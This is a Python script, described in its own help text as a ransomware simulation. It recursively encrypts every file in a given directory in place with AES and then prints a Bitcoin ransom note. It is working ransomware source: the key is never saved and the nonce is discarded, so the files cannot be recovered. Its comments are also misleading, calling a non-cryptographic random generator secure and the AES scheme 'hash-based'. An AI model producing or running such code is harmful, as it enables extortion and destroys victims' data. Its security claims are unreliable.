import os
import argparse
import random
import string
import hashlib
from Crypto.Cipher import AES

# Function to generate a random encryption key using a cryptographically secure random number generator
def generate_key(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to encrypt a file using AES encryption
def encrypt_file(file_path, encryption_key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = encrypt(data, encryption_key)
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
        print(f"File {file_path} encrypted successfully!")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {str(e)}")

# Function to encrypt data using AES encryption
def encrypt(data, encryption_key):
    # In a real implementation, use a secure encryption library like cryptography
    # Here, for demonstration, we'll use a simple hash-based encryption
    salt = os.urandom(16)
    key = hashlib.pbkdf2_hmac('sha256', encryption_key.encode(), salt, 100000)
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return salt + ciphertext + tag

# Function to display a more detailed ransom note
def display_ransom_note():
    ransom_note = """
    Your files have been encrypted!

    To decrypt your files, follow these steps:
    1. Send $1000 worth of Bitcoin to the following address: [Bitcoin address]
    2. Email proof of payment to [email address]
    3. Upon confirmation of payment, you will receive a decryption tool.

    Warning: Do not attempt to decrypt files without the decryption tool.
    """
    print(ransom_note)

# Main function
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Ransomware simulation script")
    parser.add_argument("directory", help="Directory to encrypt")
    parser.add_argument("-k", "--key", help="Encryption key")
    args = parser.parse_args()

    # Generate encryption key if not provided
    encryption_key = args.key if args.key else generate_key(32)  # 32 bytes for AES encryption

    # Encrypt files in the specified directory and its subdirectories
    directory = args.directory
    for root, dirs, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            encrypt_file(file_path, encryption_key)

    # Display detailed ransom note
    display_ransom_note()

if __name__ == "__main__":
    main()
